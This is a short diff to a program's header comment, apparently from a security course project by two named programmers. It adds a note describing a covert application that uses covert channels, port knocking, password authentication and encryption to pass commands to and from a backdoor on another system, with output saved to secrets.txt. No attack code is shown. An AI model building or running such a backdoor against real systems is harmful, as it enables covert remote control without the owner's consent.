@@ -12,7 +12,9 @@
 #  PROGRAMMERS:        Slade Solobay & Zach Smoroden
 #
 #  NOTES:
-#
+#                      A covert application that uses a combination of covert channels, port knocking, password
+#                      authentication and encryption to send and receive commands to and from a backdoor running on
+#                      another system.
 #
 #  OUTPUT: secrets.txt - will be saved in the program root directory.
 #
